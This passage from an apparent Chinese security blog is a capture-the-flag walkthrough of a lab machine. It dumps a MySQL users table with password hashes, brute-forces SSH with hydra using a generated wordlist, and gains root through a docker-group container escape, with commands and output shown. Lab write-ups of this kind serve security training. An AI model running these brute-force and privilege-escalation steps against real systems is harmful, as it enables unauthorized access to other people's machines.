class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,0,0,0,0,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>N<span class="pl-s"><span class="pl-pds">'</span>);</span>
+<span class="pl-s">REPLACE INTO tmp_user VALUES (<span class="pl-pds">'</span></span>::1<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,0,0,0,0,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>N<span class="pl-s"><span class="pl-pds">'</span>);</span>
+<span class="pl-s">INSERT INTO user SELECT * FROM tmp_user WHERE @had_user_table=0;</span>
+<span class="pl-s">DROP TABLE tmp_user;</span>
+<span class="pl-s"></span>
+<span class="pl-s">CREATE TEMPORARY TABLE tmp_proxies_priv LIKE proxies_priv;</span>
+<span class="pl-s">INSERT INTO tmp_proxies_priv VALUES (<span class="pl-pds">'</span></span>localhost<span class="pl-s"><span class="pl-pds">'</span>, <span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>, <span class="pl-pds">'</span><span class="pl-pds">'</span>, <span class="pl-pds">'</span><span class="pl-pds">'</span>, TRUE, <span class="pl-pds">'</span><span class="pl-pds">'</span>, now());</span>
+<span class="pl-s">REPLACE INTO tmp_proxies_priv SELECT @current_hostname, <span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>, <span class="pl-pds">'</span><span class="pl-pds">'</span>, <span class="pl-pds">'</span><span class="pl-pds">'</span>, TRUE, <span class="pl-pds">'</span><span class="pl-pds">'</span>, now() FROM DUAL WHERE LOWER (@current_hostname) != <span class="pl-pds">'</span></span>localhost<span class="pl-s"><span class="pl-pds">'</span>;</span>
+<span class="pl-s">INSERT INTO  proxies_priv SELECT * FROM tmp_proxies_priv WHERE @had_proxies_priv_table=0;</span>
+<span class="pl-s">DROP TABLE tmp_proxies_priv;</span>
+<span class="pl-s">FLUSH PRIVILEGES;</span>
+<span class="pl-s"></span></pre></div>
+<h5>MySQL 数据库的常用命令</h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mysql -uroot -proot123 -h127.0.0.1 -P3306
+<span class="pl-c"><span class="pl-c">#</span>查库</span>
+SHOW DATABASES<span class="pl-k">;</span>  -- 列出所有数据库
+SHOW DATABASES LIKE <span class="pl-s"><span class="pl-pds">'</span>pattern%<span class="pl-pds">'</span></span><span class="pl-k">;</span>  -- 按模式过滤（如<span class="pl-s"><span class="pl-pds">`</span>test_%<span class="pl-pds">`</span></span>）
+<span class="pl-c"><span class="pl-c">#</span>选择/切换数据库</span>
+USE database_name<span class="pl-k">;</span>  -- 进入指定数据库
+SELECT <span class="pl-en">DATABASE</span>();  -- 查看当前所在数据库
+<span class="pl-c"><span class="pl-c">#</span>查表</span>
+SHOW TABLES<span class="pl-k">;</span>  -- 当前库的所有表
+SHOW TABLES FROM db_name<span class="pl-k">;</span>  -- 查看其他库的表（无需切换库）
+SHOW TABLES LIKE <span class="pl-s"><span class="pl-pds">'</span>user_%<span class="pl-pds">'</span></span><span class="pl-k">;</span>  -- 按名称过滤
+<span class="pl-c"><span class="pl-c">#</span>查字段</span>
+<span class="pl-k">select</span> <span class="pl-smi">*</span> from table_name<span class="pl-k">;</span>
+SHOW COLUMNS FROM table_name<span class="pl-k">;</span> </pre></div>
+<p>查询结果</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mysql<span class="pl-k">&gt;</span> SHOW DATABASES<span class="pl-k">;</span>
++--------------------+
+<span class="pl-k">|</span> Database           <span class="pl-k">|</span>
++--------------------+
+<span class="pl-k">|</span> information_schema <span class="pl-k">|</span>
+<span class="pl-k">|</span> mysql              <span class="pl-k">|</span>
+<span class="pl-k">|</span> performance_schema <span class="pl-k">|</span>
+<span class="pl-k">|</span> pikachu            <span class="pl-k">|</span>
+<span class="pl-k">|</span> pkxss              <span class="pl-k">|</span>
+<span class="pl-k">|</span> sys                <span class="pl-k">|</span>
++--------------------+
+6 rows <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.04 sec)
+
+mysql<span class="pl-k">&gt;</span> use pikachu<span class="pl-k">;</span>
+Reading table information <span class="pl-k">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql<span class="pl-k">&gt;</span> show tables<span class="pl-k">;</span>
++-------------------+
+<span class="pl-k">|</span> Tables_in_pikachu <span class="pl-k">|</span>
++-------------------+
+<span class="pl-k">|</span> httpinfo          <span class="pl-k">|</span>
+<span class="pl-k">|</span> member            <span class="pl-k">|</span>
+<span class="pl-k">|</span> message           <span class="pl-k">|</span>
+<span class="pl-k">|</span> users             <span class="pl-k">|</span>
+<span class="pl-k">|</span> xssblind          <span class="pl-k">|</span>
++-------------------+
+5 rows <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.00 sec)
+
+mysql<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users<span class="pl-k">;</span>
++----+----------+----------------------------------+-------+
+<span class="pl-k">|</span> id <span class="pl-k">|</span> username <span class="pl-k">|</span> password                         <span class="pl-k">|</span> level <span class="pl-k">|</span>
++----+----------+----------------------------------+-------+
+<span class="pl-k">|</span>  1 <span class="pl-k">|</span> admin    <span class="pl-k">|</span> e10adc3949ba59abbe56e057f20f883e <span class="pl-k">|</span>     1 <span class="pl-k">|</span>
+<span class="pl-k">|</span>  2 <span class="pl-k">|</span> pikachu  <span class="pl-k">|</span> 670b14728ad9902aecba32e22fa4f6bd <span class="pl-k">|</span>     2 <span class="pl-k">|</span>
+<span class="pl-k">|</span>  3 <span class="pl-k">|</span> <span class="pl-c1">test</span>     <span class="pl-k">|</span> e99a18c428cb38d5f260853678922e03 <span class="pl-k">|</span>     3 <span class="pl-k">|</span>
+<span class="pl-k">|</span>  4 <span class="pl-k">|</span> ml       <span class="pl-k">|</span> I heard you like explosives      <span class="pl-k">|</span>     4 <span class="pl-k">|</span>
++----+----------+----------------------------------+-------+
+4 rows <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.00 sec)
+</pre></div>
+<p>在数据库中获得靶机宿主账户<code class="notranslate">ml</code>,上面的密码不能直接登陆，<code class="notranslate">md5</code>解码也不行，不要忘了前面<code class="notranslate">hint.txt</code>中的提示信息</p>
+<h3>4.获得<code class="notranslate">ml</code>权限</h3>
+<h5><code class="notranslate">hydra</code>爆破</h5>
+<p>既然密码是账户名重复不同次数，手动构造一个字典，再<code class="notranslate">hydra</code>爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> for i in {1..30}; do printf "ml%.0s" $(seq 1 $i); echo; done &gt; pass.txt</span>
+
+└─<span class="pl-c"><span class="pl-c">#</span> hydra -l ml  -P pass.txt ssh://$IP  -t 4 -V -I -u -f -e nsr</span>
+Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 08:44:36
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 33 login tries (l:1/p:33), <span class="pl-k">~</span>9 tries per task
+[DATA] attacking ssh://192.168.43.19:22/
+[ATTEMPT] target 192.168.43.19 - login <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - pass <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - 1 of 33 [child 0] (0/0)
+[ATTEMPT] target 192.168.43.19 - login <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - pass <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> - 2 of 33 [child 1] (0/0)
+[ATTEMPT] target 192.168.43.19 - login <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - pass <span class="pl-s"><span class="pl-pds">"</span>lm<span class="pl-pds">"</span></span> - 3 of 33 [child 2] (0/0)
+[ATTEMPT] target 192.168.43.19 - login <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - pass <span class="pl-s"><span class="pl-pds">"</span>mlml<span class="pl-pds">"</span></span> - 5 of 33 [child 3] (0/0)
+[ATTEMPT] target 192.168.43.19 - login <span class="pl-s"><span class="pl-pds">"</span>ml<span class="pl-pds">"</span></span> - pass <span class="pl-s"><span class="pl-pds">"</span>mlmlml<span class="pl-pds">"</span></span> - 6 of 33 [child 1] (0/0)
+[22][ssh] host: 192.168.43.19   login: ml   password: mlmlml
+[STATUS] attack finished <span class="pl-k">for</span> 192.168.43.19 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-25 08:44:37</pre></div>
+<p>使用<code class="notranslate">ml/mlmlml</code>成功<code class="notranslate">ssh</code>登陆靶机</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh ml@192.168.43.19</span>
+ml@192.168.43.19<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">Linux language 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="pl-s"></span>
+<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="pl-s">the exact distribution terms for each program are described in the</span>
+<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">ml@language:~$ id</span>
+<span class="pl-s">uid=1001(ml) gid=1001(ml) groups=1001(ml),113(docker)</span></pre></div>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ml@language:<span class="pl-k">~</span>$ id
+uid=1001(ml) gid=1001(ml) groups=1001(ml),113(docker)
+ml@language:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> 
+ml@language:<span class="pl-k">~</span>$ ls
+user.txt
+ml@language:<span class="pl-k">~</span>$ <span class="pl-c1">pwd</span>
+/home/ml
+ml@language:<span class="pl-k">~</span>$ cat user.txt 
+flag{this-is-user-flag<span class="pl-k">!!!</span>}</pre></div>
+<h3>5.获得<code class="notranslate">root</code>权限</h3>
+<p>注意到<code class="notranslate">ml</code>用户属组中有 <code class="notranslate">docker</code>，直接<code class="notranslate">docker</code>逃逸提权</p>
+<p>这里拉取镜像启动一个新的容器，以<code class="notranslate">sh</code>或者<code class="notranslate">/bin/bash</code>作为<code class="notranslate">shell</code>启动，并且将该宿主机的根目录挂在到容器的<code class="notranslate">/mnt</code>目录下,网上现成的资料[<a href="https://blog.csdn.net/qq_43531669/article/details/145325152" rel="nofollow">很多</a>](<a href="https://blog.csdn.net/qq_43531669/article/details/145325152" rel="nofollow">https://blog.csdn.net/qq_43531669/article/details/145325152</a>)</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ml@language:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+docker -H tcp://x.x.x.x:2375 run -it -v /:/mnt alpine:latest sh  或者 /bin/bash
+
+Unable to find image <span class="pl-s"><span class="pl-pds">'</span>alpine:latest<span class="pl-pds">'</span></span> locally
+
+latest: Pulling from library/alpine
+fe07684b16b8: Pull <span class="pl-c1">complete</span> 
+Digest: sha256:8a1f59ffb675680d47db6337b49d22281a139e9d709335b492be023728e11715
+Status: Downloaded newer image <span class="pl-k">for</span> alpine:latest
+
+<span class="pl-c"><span class="pl-c">#</span> # id</span>
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+
+<span class="pl-c"><span class="pl-c">#</span>也可以用本地现成的镜像</span>
+ml@language:/tmp$ docker ps -a
+CONTAINER ID   IMAGE            COMMAND     CREATED        STATUS        PORTS                            NAMES
+b0dd1db70539   area39/pikachu   <span class="pl-s"><span class="pl-pds">"</span>/run.sh<span class="pl-pds">"</span></span>   46 hours ago   Up 26 hours   3306/tcp, 0.0.0.0:9999-<span class="pl-k">&gt;</span>80/tcp   pikachu
+ml@language:/tmp$ docker run -v /:/mnt --rm -it area39/pikachu  chroot /mnt sh
+<span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<h5>拿到<code class="notranslate">root.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> # id</span>
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+<span class="pl-c"><span class="pl-c">#</span> cd</span>
+<span class="pl-c"><span class="pl-c">#</span> ls</span>
+root.txt
+<span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
+flag{this-is-root-flag<span class="pl-k">!!!</span>}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Pingsag3 Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","pingsag3/pingsag3.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
